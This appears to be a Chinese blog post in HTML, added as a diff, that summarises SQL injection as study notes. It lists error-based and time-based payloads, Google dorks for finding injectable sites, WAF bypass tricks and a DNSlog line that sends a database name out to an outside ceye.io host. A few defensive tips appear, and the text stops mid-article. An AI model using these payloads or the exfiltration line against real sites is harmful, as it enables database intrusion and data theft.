@@ -1,0 +1,746 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sql注入总结 | LuoYuのBLOG</title><meta name="description" content="[toc] mysqlmysql常用函数：12345678910111213141516171819202122232425262728293031system_user()返回系统用户名user()数据库用户名current_user()当前用户session_user() &#x2F;&#x2F;链接数据库的用户名database()数据库@@datadir数据库路径@@basedir数据库安"><meta name="keywords" content="sql注入"><meta name="author" content="LuoYu"><meta name="copyright" content="LuoYu"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/hack1.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="sql注入总结"><meta name="twitter:description" content="[toc] mysqlmysql常用函数：12345678910111213141516171819202122232425262728293031system_user()返回系统用户名user()数据库用户名current_user()当前用户session_user() &#x2F;&#x2F;链接数据库的用户名database()数据库@@datadir数据库路径@@basedir数据库安"><meta name="twitter:image" content="http://retnull.top/img/test4.jpg"><meta property="og:type" content="article"><meta property="og:title" content="sql注入总结"><meta property="og:url" content="http://retnull.top/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><meta property="og:site_name" content="LuoYuのBLOG"><meta property="og:description" content="[toc] mysqlmysql常用函数：12345678910111213141516171819202122232425262728293031system_user()返回系统用户名user()数据库用户名current_user()当前用户session_user() &#x2F;&#x2F;链接数据库的用户名database()数据库@@datadir数据库路径@@basedir数据库安"><meta property="og:image" content="http://retnull.top/img/test4.jpg"><meta property="article:published_time" content="2020-04-24T04:54:13.000Z"><meta property="article:modified_time" content="2020-11-14T14:45:26.323Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://retnull.top/2020/04/24/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"><link rel="prev" title="bugku_writeup_cookie欺骗" href="http://retnull.top/2020/04/24/bugku-writeup-cookie%E6%AC%BA%E9%AA%97/"><link rel="next" title="bugku_速度要快" href="http://retnull.top/2020/04/23/bugku-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  baiduPush: true,
+  highlightCopy: true,
+  highlightLang: true,
+  highlightShrink: 'false',
+  isFontAwesomeV5: false,
+  isPhotoFigcaption: false
+  
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isSidebar: true  
+  }</script><noscript><style>
+#page-header {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/dog.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">38</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">57</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">29</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql"><span class="toc-number">1.</span> <span class="toc-text">mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql常用函数："><span class="toc-number">1.1.</span> <span class="toc-text">mysql常用函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数替换"><span class="toc-number">1.2.</span> <span class="toc-text">函数替换:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网站路径："><span class="toc-number">1.3.</span> <span class="toc-text">网站路径：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql相关库"><span class="toc-number">1.4.</span> <span class="toc-text">mysql相关库</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">1.4.1.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-user"><span class="toc-number">1.4.2.</span> <span class="toc-text">mysql.user</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注释符号"><span class="toc-number">1.5.</span> <span class="toc-text">注释符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入流程"><span class="toc-number">1.6.</span> <span class="toc-text">sql注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql注入点："><span class="toc-number">1.6.1.</span> <span class="toc-text">sql注入点：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错盲注"><span class="toc-number">1.7.</span> <span class="toc-text">报错盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#主键冲突"><span class="toc-number">1.7.1.</span> <span class="toc-text">主键冲突</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xpath错误"><span class="toc-number">1.7.2.</span> <span class="toc-text">xpath错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#整形溢出-mysql-gt-5-5-5"><span class="toc-number">1.7.3.</span> <span class="toc-text">整形溢出 mysql&gt;5.5.5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据重复"><span class="toc-number">1.7.4.</span> <span class="toc-text">数据重复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-number">1.8.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dnslog盲注"><span class="toc-number">1.9.</span> <span class="toc-text">Dnslog盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass"><span class="toc-number">1.10.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关函数绕过"><span class="toc-number">1.11.</span> <span class="toc-text">相关函数绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap进阶"><span class="toc-number">2.</span> <span class="toc-text">sqlmap进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用参数"><span class="toc-number">2.0.1.</span> <span class="toc-text">&#x3D;&#x3D;常用参数&#x3D;&#x3D;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tamper脚本编写"><span class="toc-number">2.1.</span> <span class="toc-text">tamper脚本编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql注入防御："><span class="toc-number">2.2.</span> <span class="toc-text">mysql注入防御：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access注入"><span class="toc-number">3.</span> <span class="toc-text">Access注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tips"><span class="toc-number">3.1.</span> <span class="toc-text">tips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数"><span class="toc-number">3.2.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基本语句、"><span class="toc-number">3.3.</span> <span class="toc-text">基本语句、</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#偏移注入"><span class="toc-number">3.4.</span> <span class="toc-text">偏移注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access-跨库查询"><span class="toc-number">3.5.</span> <span class="toc-text">Access 跨库查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL"><span class="toc-number">4.</span> <span class="toc-text">MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#系统数据库"><span class="toc-number">4.1.</span> <span class="toc-text">系统数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#权限："><span class="toc-number">4.2.</span> <span class="toc-text">权限：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入"><span class="toc-number">4.3.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oracke-amp-postgresql"><span class="toc-number">5.</span> <span class="toc-text">oracke&amp;postgresql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关表"><span class="toc-number">5.1.</span> <span class="toc-text">相关表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注入-1"><span class="toc-number">5.2.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#error-i"><span class="toc-number">5.2.1.</span> <span class="toc-text">error_i</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-number">5.3.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注-1"><span class="toc-number">5.4.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#外带通信"><span class="toc-number">5.5.</span> <span class="toc-text">外带通信</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权-amp-RCE"><span class="toc-number">5.6.</span> <span class="toc-text">提权&amp;RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据库类型判断"><span class="toc-number">6.</span> <span class="toc-text">数据库类型判断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-1"><span class="toc-number">6.1.</span> <span class="toc-text">bypass</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/test4.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">LuoYuのBLOG</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> List</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> Movie</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">sql注入总结</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-04-24 12:54:13"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-04-24</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-11-14 22:45:26"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-11-14</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div id="article-container"><p>[toc]</p>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="mysql常用函数："><a href="#mysql常用函数：" class="headerlink" title="mysql常用函数："></a>mysql常用函数：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">system_user()</span><br><span class="line">返回系统用户名</span><br><span class="line">user()</span><br><span class="line">数据库用户名</span><br><span class="line">current_user()</span><br><span class="line">当前用户</span><br><span class="line">session_user() &#x2F;&#x2F;链接数据库的用户名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database()</span><br><span class="line">数据库</span><br><span class="line">@@datadir</span><br><span class="line">数据库路径</span><br><span class="line">@@basedir</span><br><span class="line">数据库安装路径</span><br><span class="line">@@version_compile_os</span><br><span class="line">操作系统信息</span><br><span class="line">concat_ws(分隔符,..)</span><br><span class="line">用自定义分隔符分割数据</span><br><span class="line">group_concat()</span><br><span class="line">用逗号分割数据 一行显示</span><br><span class="line"></span><br><span class="line">#读写文件需要root权限 网站的绝对路径 由连接用户决定</span><br><span class="line">slelect load_file(路径)</span><br><span class="line">读文件</span><br><span class="line">select ... into outfile(路径）</span><br><span class="line">写文件</span><br><span class="line"></span><br><span class="line">                        </span><br><span class="line">mid(字符串，起始位置，长度） 从1开始 &#x3D;&#x3D;substr()</span><br><span class="line">返回字符串的一部分</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>length(str)</strong> ：返回字符串str的长度</p>
+<p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p>
+<p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p>
+<p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p>
+<p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p>
+<p><strong>if(a,b,c)</strong> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p>
+</blockquote>
+<h3 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换:"></a>函数替换:</h3><blockquote>
+<p><code>suustr = substring sub mid</code></p>
+<p><code>ASCII /hex bin ord</code></p>
+<p><code>sleep benchmark</code></p>
+</blockquote>
+<h3 id="网站路径："><a href="#网站路径：" class="headerlink" title="网站路径："></a>网站路径：</h3><blockquote>
+<ul>
+<li>报错显示</li>
+<li>Google harking</li>
+<li>配置文件</li>
+<li>漏洞报错<ul>
+<li>phpcms</li>
+</ul>
+</li>
+<li>遗留文件<ul>
+<li>phpinfo</li>
+</ul>
+</li>
+<li>猜测 爆破</li>
+</ul>
+</blockquote>
+<h3 id="mysql相关库"><a href="#mysql相关库" class="headerlink" title="mysql相关库"></a>mysql相关库</h3><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><blockquote>
+<ol>
+<li><strong><em>infromation_schema.columns\</em></strong>:<ol>
+<li>table_schema 数据库名</li>
+<li>table_name 表名</li>
+<li>column_name 列名</li>
+</ol>
+</li>
+<li><strong><em>information_schema.tables\</em></strong><ol>
+<li>table_schema 数据库名</li>
+<li>table_name 表名</li>
+</ol>
+</li>
+<li>information_schema.schemata<ol>
+<li>schema_name 数据库名</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<h4 id="mysql-user"><a href="#mysql-user" class="headerlink" title="mysql.user"></a>mysql.user</h4><blockquote>
+<p>保存用户密码和host等信息</p>
+</blockquote>
+<h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h3><blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># </span><br><span class="line">&#x2F;**&#x2F;  &#x2F;*&#x2F;**&#x2F;这样是等效于&#x2F;**&#x2F;</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">&#96;</span><br><span class="line">&#x2F;*!*&#x2F; 内列注释为什么放在这里呢，因为它也可以当作一个空格 &#x2F;*!&#x2F;*!*&#x2F;是等效于&#x2F;*!*&#x2F;的</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h3><h4 id="sql注入点："><a href="#sql注入点：" class="headerlink" title="sql注入点："></a>sql注入点：</h4><blockquote>
+<p>无特定目标：<code>inurl:.php?id=</code></p>
+<p>有特定目标：<code>nurl:.php?id=  site:target.com</code></p>
+</blockquote>
+<p>==用sqlmap检测==、</p>
+<blockquote>
+<p>sqlmap-m filename(每行保存一个url）</p>
+<p>sqlmap –crawl (对目标网站进行爬取，然后依次测试）</p>
+</blockquote>
+<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><blockquote>
+<h4 id="主键冲突"><a href="#主键冲突" class="headerlink" title="主键冲突"></a>主键冲突</h4><blockquote>
+<p><code>union select 1,count(*),concat(version(),floor(rand(0)*2))x from information_schema.columns group by x;–+</code></p>
+<p><code>union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2));–+</code>    </p>
+<p>==rand被禁止==</p>
+<p><code>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></p>
+</blockquote>
+<h4 id="xpath错误"><a href="#xpath错误" class="headerlink" title="xpath错误"></a>xpath错误</h4><p><code>updatexml(par1,par2,pat3)</code></p>
+<blockquote>
+<p><code>and updatexml(1,concat(0×26,(version()),0×26),1);</code></p>
+</blockquote>
+<blockquote>
+<p>参数2需要的是<code>xpath</code>格式的字符串</p>
+</blockquote>
+<p><code>ExtractValue()</code></p>
+<blockquote>
+<p><code>and (extractvalue(1,concat(0×26,(version()),0×26)));</code></p>
+</blockquote>
+<h4 id="整形溢出-mysql-gt-5-5-5"><a href="#整形溢出-mysql-gt-5-5-5" class="headerlink" title="整形溢出 mysql&gt;5.5.5"></a>整形溢出 mysql&gt;5.5.5</h4><blockquote>
+<p><code>exp(x)</code>e的x次方</p>
+<p>exp超过==710==就会溢出</p>
+<p>==函数执行成功返回0 取反后是大整数==</p>
+<p><code>Payload: and (EXP(~(select * from(select version())a)));</code></p>
+</blockquote>
+<h4 id="数据重复"><a href="#数据重复" class="headerlink" title="数据重复"></a>数据重复</h4><blockquote>
+<p><code>payload：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</code></p>
+</blockquote>
+</blockquote>
+<hr>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>==基本语法==</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),1,1))&gt;115,0,sleep(3))%23</span><br><span class="line">if(left(user(),1)&#x3D;&#39;a&#39;,0,sleep(3))</span><br><span class="line">·if(条件,true,false)&#96;</span><br></pre></td></tr></table></figure>
+
+<p>确定字段位数：<code>length()</code></p>
+<p>确定字段名：</p>
+<blockquote>
+<p><code>select sleep(if(ORD(mid(table_name,1,1))==61,0,5)) from ...</code></p>
+</blockquote>
+<h3 id="Dnslog盲注"><a href="#Dnslog盲注" class="headerlink" title="Dnslog盲注"></a>Dnslog盲注</h3><p>==原理==</p>
+<blockquote>
+<p>布尔盲注或者时间盲注等会发送多次请求，触发设备的保护。用dnslog可以减少请求次数</p>
+</blockquote>
+  <figure class="highlight plain"><figcaption><span>load_file(concat('\\\\',(select database()),'.mysql.r40urp.ceye.io\\abd'))```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">***load_file***只能在Windows平台</span><br><span class="line"></span><br><span class="line">0 </span><br><span class="line"></span><br><span class="line">## sql注入绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 宽字节注入</span><br><span class="line"></span><br><span class="line">&gt; 大小是一个字节的是窄字节，大小是两个字节的是宽字节。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 常用的宽字节：GB2312 GBK GB18030 BIG5 Shift_JIS等都是宽字节 都是两个字节</span><br><span class="line"></span><br><span class="line">![image-20200429131407481](sql注入总结&#x2F;image-20200429131407481.png)</span><br><span class="line"></span><br><span class="line">&gt; 自动加上的&#x2F;和%df组成了汉字，而单引号得以保留</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;sqlmap宽字节注入&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">&gt; 在url后面添加%df‘</span><br><span class="line">&gt;</span><br><span class="line">&gt; 使用unmagicquotes.py脚本绕过</span><br><span class="line">&gt;</span><br><span class="line">&gt; </span><br><span class="line"></span><br><span class="line">***宽字节防御***</span><br><span class="line"></span><br><span class="line">&gt; 1. 直接使用utf-8</span><br><span class="line">&gt; 2. mysql_real_escape_string函数，前提是使用&#96;mysql_set_charset(&#39;gbk&#39;.$con)&#96;</span><br><span class="line">&gt; 3. 设置参数 &#96;character_set_client&#x3D;binary&#96; 二进制形式来连接数据库</span><br><span class="line"></span><br><span class="line">### 二次编码注入</span><br><span class="line"></span><br><span class="line">&gt; 在二次解码转化中夹了一次转义，但是转义未识别到字符，接着在最后一次解码中带入了未被转义字符</span><br><span class="line"></span><br><span class="line">&#96;%2527&#96;---&gt;&#96;%27&#96;--&#96;&#39;&#96;&#39;</span><br><span class="line"></span><br><span class="line">### 二次注入</span><br><span class="line"></span><br><span class="line">&gt; 1. 插入恶意数据</span><br><span class="line">&gt; 2. 引用恶意数据</span><br><span class="line">&gt;</span><br><span class="line">&gt; 防御：</span><br><span class="line">&gt;</span><br><span class="line">&gt; 对提交数据严谨对待，对内部的数据也要严格检查</span><br><span class="line"></span><br><span class="line">### mysql用户高权限注入</span><br><span class="line"></span><br><span class="line">&gt; #### 跨库注入</span><br><span class="line">&gt;</span><br><span class="line">&gt; &gt; 需要root注入，一个网站无sql注入，但是获取到有root用户的数据库是可以跨库得到所以数据库信息</span><br><span class="line"></span><br><span class="line">### HTTP_HEAD注入-XFF(X-Forward-For)注入</span><br><span class="line"></span><br><span class="line">&gt; 用户的真实IP</span><br><span class="line"></span><br><span class="line">## waf绕过</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&gt; ***白盒绕过***</span><br><span class="line">&gt;</span><br><span class="line">&gt; 大小写：Or,OR,OR</span><br><span class="line">&gt;</span><br><span class="line">&gt; 等价替换：and:&amp;&amp; of:||</span><br><span class="line"></span><br><span class="line">### 黑盒绕过</span><br><span class="line"></span><br><span class="line">1. 架构层绕过waf：</span><br><span class="line"></span><br><span class="line">&gt; 1. 寻找源站：针对云waf</span><br><span class="line">&gt; 2. 同网段利用  绕过waf保护区域</span><br><span class="line">&gt; 3. 边界漏洞 ：ssrf等</span><br><span class="line"></span><br><span class="line">2. 资源限制绕过</span><br><span class="line"></span><br><span class="line">&gt; post大于BODY</span><br><span class="line"></span><br><span class="line">3. 协议绕过</span><br><span class="line"></span><br><span class="line">&gt; 尝试post和get等切换</span><br><span class="line">&gt;</span><br><span class="line">&gt; content-type:</span><br><span class="line">&gt;</span><br><span class="line">&gt; 参数污染：中间件和waf的识别差别 </span><br><span class="line"></span><br><span class="line">4. 规则层面的绕过</span><br><span class="line"></span><br><span class="line">&gt; &#96;&#96;&#96;myslq</span><br><span class="line">&gt; union&#x2F;**&#x2F;select</span><br><span class="line">&gt; union&#x2F;*aaaaaaaaaaaa*&#x2F;select</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>内联注释：<code>/*!xxx*/</code>加了！会执行</p>
+</blockquote>
+<blockquote>
+<p>空白符号绕过</p>
+<p>mysql空白符：<code>%09.%0A,%0B,%0D,%20,%0C,%A0/*Xxx*/</code></p>
+<p>正则的空白符：<code>%09,%0A,%0B,%0D,%20</code></p>
+<p>例如<code>union%250C</code></p>
+</blockquote>
+<h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><blockquote>
+<p><code>+，-，*，%，/，&lt;&lt;，&gt;&gt;，||，|，&amp;，&amp;&amp;，也可以将and换成or，&amp;&amp;， ||等</code></p>
